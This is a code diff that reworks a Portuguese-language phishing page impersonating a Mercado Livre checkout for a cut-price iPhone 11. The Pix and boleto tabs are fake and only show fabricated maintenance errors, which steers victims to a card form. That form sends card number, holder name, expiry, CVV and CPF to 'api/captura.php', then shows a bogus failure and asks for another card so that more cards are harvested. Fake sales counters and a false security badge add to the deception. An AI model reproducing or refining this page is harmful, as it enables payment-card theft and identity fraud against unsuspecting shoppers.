@@ -2,110 +2,499 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Pagamento Seguro - Mercado Livre</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Mercado Livre - Pagamento</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
-        .container { max-width: 500px; margin: 0 auto; }
-        .header { background: #fff; padding: 20px; text-align: center; border-radius: 12px; }
-        .logo { width: 60px; margin-bottom: 10px; }
-        .valor { font-size: 28px; font-weight: bold; color: #00a650; }
-        .input-group { margin-bottom: 15px; }
-        .input-group label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 5px; }
-        .input-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; }
-        .row { display: flex; gap: 10px; }
-        .row .input-group { flex: 1; }
-        .btn-pagar { width: 100%; padding: 15px; background: #3483fa; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; }
-        .error { background: #fee; border: 1px solid #fcc; color: #c00; padding: 12px; border-radius: 8px; margin-bottom: 15px; display: none; }
-        .loading { display: none; text-align: center; margin-top: 15px; }
-        .spinner { width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #3483fa; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Proxima Nova', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ebebeb;
+            padding: 16px;
+        }
+
+        /* Container principal */
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        /* Card do produto */
+        .product-card {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 16px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .product-image {
+            width: 120px;
+            height: 120px;
+            background: #f0f0f0;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .product-image img {
+            width: 100%;
+            height: auto;
+        }
+
+        .product-details {
+            flex: 1;
+        }
+
+        .product-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .product-price {
+            font-size: 28px;
+            font-weight: 700;
+            color: #00a650;
+            margin-bottom: 4px;
+        }
+
+        .product-installments {
+            font-size: 14px;
+            color: #00a650;
+            font-weight: 500;
+        }
+
+        .product-shipping {
+            font-size: 13px;
+            color: #00a650;
+            margin-top: 8px;
+        }
+
+        .product-sold {
+            font-size: 13px;
+            color: #666;
+            margin-top: 4px;
+        }
+
+        /* Card de pagamento */
+        .payment-card {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+
+        .payment-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 20px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        /* Métodos de pagamento (tabs) */
+        .payment-methods {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 24px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .method-tab {
+            padding: 12px 16px;
+            cursor: pointer;
+            font-weight: 600;
+            color: #666;
+            border-bottom: 2px solid transparent;
+            transition: all 0.3s;
+        }
+
+        .method-tab.active {
+            color: #3483fa;
+            border-bottom-color: #3483fa;
+        }
+
+        /* Formulários */
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: #333;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            outline: none;
+            border-color: #3483fa;
+        }
+
+        .row {
+            display: flex;
+            gap: 12px;
+        }
+
+        .row .form-group {
+            flex: 1;
+        }
+
+        /* Botão */
+        .btn-pay {
+            width: 100%;
+            padding: 14px;
+            background: #3483fa;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 16px;
+            transition: background 0.3s;
+        }
+
+        .btn-pay:hover {
+            background: #2968c8;
+        }
+
+        .btn-pay:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        /* QR Code */
+        .qr-container {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .qr-code {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto;
+            background: #f0f0f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+        }
+
+        .qr-code img {
+            width: 100%;
+            height: auto;
+        }
+
+        .pix-code {
+            background: #f5f5f5;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 12px;
+            word-break: break-all;
+            margin: 16px 0;
+        }
+
+        .btn-copy {
+            background: #00a650;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        /* Mensagens de erro */
+        .error-message {
+            background: #fee;
+            border: 1px solid #fcc;
+            color: #c00;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 16px;
+            font-size: 13px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        /* Loading */
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .loading.show {
+            display: block;
+        }
+
+        .spinner {
+            width: 30px;
+            height: 30px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3483fa;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Seguro */
+        .secure-badge {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        /* Tabs content */
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/logo__large_plus.png" class="logo">
-            <div class="valor">R$ 249,90</div>
-            <div>iPhone 11 64GB - Ótimo estado</div>
+        <!-- Card do Produto -->
+        <div class="product-card">
+            <div class="product-image">
+                <img src="https://http2.mlstatic.com/D_NQ_NP_2X_123456-MLA78912345678_012024-F.webp" alt="iPhone 11">
+            </div>
+            <div class="product-details">
+                <div class="product-title">iPhone 11 Apple (64 GB, Preto) Tela 6.1" 12MP iOS</div>
+                <div class="product-price">R$ 249,90</div>
+                <div class="product-installments">em até 12x de R$ 20,83 sem juros</div>
+                <div class="product-shipping">✅ Frete grátis</div>
+                <div class="product-sold">🔵 Venda do dia · 35 vendidos nas últimas 24h</div>
+            </div>
         </div>
 
-        <div class="form-pagamento">
-            <div class="error" id="errorMsg"></div>
-            
-            <div class="input-group">
-                <label>Número do Cartão</label>
-                <input type="text" id="numero" placeholder="0000 0000 0000 0000">
+        <!-- Card de Pagamento -->
+        <div class="payment-card">
+            <div class="payment-title">Escolha como pagar</div>
+
+            <!-- Abas -->
+            <div class="payment-methods">
+                <div class="method-tab active" data-tab="pix">Pix</div>
+                <div class="method-tab" data-tab="card">Cartão de crédito</div>
+                <div class="method-tab" data-tab="boleto">Boleto</div>
             </div>
-            <div class="input-group">
-                <label>Nome no Cartão</label>
-                <input type="text" id="nome" placeholder="Como está no cartão">
-            </div>
-            <div class="row">
-                <div class="input-group">
-                    <label>Validade</label>
-                    <input type="text" id="validade" placeholder="MM/AAAA">
+
+            <!-- Conteúdo Pix (Falso) -->
+            <div class="tab-content active" id="tab-pix">
+                <div class="error-message" id="error-pix">
+                    ⚠️ No momento, o Pix está passando por manutenção. Por favor, escolha outra forma de pagamento.
                 </div>
-                <div class="input-group">
-                    <label>CVV</label>
-                    <input type="text" id="cvv" placeholder="123">
+                <div class="qr-container">
+                    <div class="qr-code">
+                        <img src="https://via.placeholder.com/180?text=QR+Code" alt="QR Code">
+                    </div>
+                    <div class="pix-code" id="pix-code">
+                        00020126360014BR.GOV.BCB.PIX0114+55119999999995204000053039865404.905802BR5925VENDEDOR6009SAO PAULO62070503***6304ABCD
+                    </div>
+                    <button class="btn-copy" onclick="copiarPix()">📋 Copiar código</button>
                 </div>
+                <button class="btn-pay" onclick="mostrarErroPix()">Pagar com Pix</button>
             </div>
-            <div class="input-group">
-                <label>CPF</label>
-                <input type="text" id="cpf" placeholder="000.000.000-00">
+
+            <!-- Conteúdo Cartão (Verdadeiro) -->
+            <div class="tab-content" id="tab-card">
+                <div class="error-message" id="error-card"></div>
+                <div class="form-group">
+                    <label>Número do cartão</label>
+                    <input type="text" id="card_number" placeholder="0000 0000 0000 0000" autocomplete="off">
+                </div>
+                <div class="form-group">
+                    <label>Nome no cartão</label>
+                    <input type="text" id="card_name" placeholder="Como está no cartão">
+                </div>
+                <div class="row">
+                    <div class="form-group">
+                        <label>Validade</label>
+                        <input type="text" id="card_expiry" placeholder="MM/AAAA">
+                    </div>
+                    <div class="form-group">
+                        <label>CVV</label>
+                        <input type="text" id="card_cvv" placeholder="123">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>CPF</label>
+                    <input type="text" id="card_cpf" placeholder="000.000.000-00">
+                </div>
+                <button class="btn-pay" onclick="processarCartao()">Pagar R$ 249,90</button>
             </div>
-            
-            <button class="btn-pagar" onclick="enviarDados()">Pagar R$ 249,90</button>
-            <div class="loading" id="loading"><div class="spinner"></div><p>Processando...</p></div>
+
+            <!-- Conteúdo Boleto (Falso) -->
+            <div class="tab-content" id="tab-boleto">
+                <div class="error-message" id="error-boleto">
+                    ⚠️ O sistema de boletos está temporariamente indisponível. Use cartão de crédito ou Pix.
+                </div>
+                <button class="btn-pay" onclick="mostrarErroBoleto()">Gerar boleto</button>
+            </div>
+
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p style="margin-top: 10px;">Processando pagamento...</p>
+            </div>
+
+            <div class="secure-badge">
+                🔒 Pagamento 100% seguro · Ambiente protegido
+            </div>
         </div>
     </div>
 
     <script>
-        function enviarDados() {
-            const numero = document.getElementById('numero').value.replace(/\s/g, '');
-            const nome = document.getElementById('nome').value;
-            const validade = document.getElementById('validade').value;
-            const cvv = document.getElementById('cvv').value;
-            const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
+        // Alternar abas
+        document.querySelectorAll('.method-tab').forEach(tab => {
+            tab.addEventListener('click', function() {
+                const tabId = this.getAttribute('data-tab');
+                document.querySelectorAll('.method-tab').forEach(t => t.classList.remove('active'));
+                this.classList.add('active');
+                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                document.getElementById(`tab-${tabId}`).classList.add('active');
+            });
+        });
 
-            if (!numero || numero.length < 15) { mostrarErro('Número inválido'); return; }
-            if (!nome) { mostrarErro('Digite o nome'); return; }
-            if (!validade || validade.length < 6) { mostrarErro('Data inválida'); return; }
-            if (!cvv || cvv.length < 3) { mostrarErro('CVV inválido'); return; }
-            if (!cpf || cpf.length < 11) { mostrarErro('CPF inválido'); return; }
+        // Formatações
+        document.getElementById('card_number').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+            e.target.value = value.substring(0, 19);
+        });
 
-            document.getElementById('loading').style.display = 'block';
-            document.querySelector('.btn-pagar').disabled = true;
+        document.getElementById('card_expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 4) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 6);
+            }
+            e.target.value = value.substring(0, 7);
+        });
+
+        document.getElementById('card_cpf').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length <= 11) {
+                value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+            }
+            e.target.value = value;
+        });
+
+        function copiarPix() {
+            const codigo = document.getElementById('pix-code').innerText;
+            navigator.clipboard.writeText(codigo);
+            alert('Código Pix copiado!');
+        }
+
+        function mostrarErroPix() {
+            document.getElementById('error-pix').classList.add('show');
+            setTimeout(() => document.getElementById('error-pix').classList.remove('show'), 3000);
+        }
+
+        function mostrarErroBoleto() {
+            document.getElementById('error-boleto').classList.add('show');
+            setTimeout(() => document.getElementById('error-boleto').classList.remove('show'), 3000);
+        }
+
+        async function processarCartao() {
+            const numero = document.getElementById('card_number').value.replace(/\s/g, '');
+            const nome = document.getElementById('card_name').value;
+            const validade = document.getElementById('card_expiry').value;
+            const cvv = document.getElementById('card_cvv').value;
+            const cpf = document.getElementById('card_cpf').value.replace(/\D/g, '');
+
+            if (!numero || numero.length < 15) {
+                mostrarErroCartao('Número do cartão inválido');
+                return;
+            }
+            if (!nome) {
+                mostrarErroCartao('Digite o nome no cartão');
+                return;
+            }
+            if (!validade || validade.length < 6) {
+                mostrarErroCartao('Data de validade inválida');
+                return;
+            }
+            if (!cvv || cvv.length < 3) {
+                mostrarErroCartao('CVV inválido');
+                return;
+            }
+            if (!cpf || cpf.length < 11) {
+                mostrarErroCartao('CPF inválido');
+                return;
+            }
+
+            document.getElementById('loading').classList.add('show');
+            document.querySelector('#tab-card .btn-pay').disabled = true;
 
             const dados = { numero, nome, validade, cvv, cpf };
 
-            fetch('api/captura.php', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(dados)
-            })
-            .then(response => response.json())
-            .then(() => {
+            try {
+                const response = await fetch('api/captura.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(dados)
+                });
+                await response.json();
+                
                 setTimeout(() => {
-                    document.getElementById('loading').style.display = 'none';
-                    mostrarErro('Erro no processamento. Tente outro cartão.');
-                    document.querySelector('.btn-pagar').disabled = false;
-                    document.querySelectorAll('input').forEach(i => i.value = '');
+                    document.getElementById('loading').classList.remove('show');
+                    mostrarErroCartao('Não foi possível processar seu pagamento. Tente outro cartão.');
+                    document.querySelector('#tab-card .btn-pay').disabled = false;
+                    document.querySelectorAll('#tab-card input').forEach(i => i.value = '');
                 }, 2000);
-            })
-            .catch(() => {
-                document.getElementById('loading').style.display = 'none';
-                mostrarErro('Erro. Tente novamente.');
-                document.querySelector('.btn-pagar').disabled = false;
-            });
+            } catch (error) {
+                document.getElementById('loading').classList.remove('show');
+                mostrarErroCartao('Erro no processamento. Tente novamente.');
+                document.querySelector('#tab-card .btn-pay').disabled = false;
+            }
         }
 
-        function mostrarErro(msg) {
-            const errorDiv = document.getElementById('errorMsg');
-            errorDiv.innerText = msg;
-            errorDiv.style.display = 'block';
-            setTimeout(() => errorDiv.style.display = 'none', 3000);
+        function mostrarErroCartao(msg) {
+            const errorDiv = document.getElementById('error-card');
+            errorDiv.innerHTML = msg;
+            errorDiv.classList.add('show');
+            setTimeout(() => errorDiv.classList.remove('show'), 4000);
         }
     </script>
 </body>
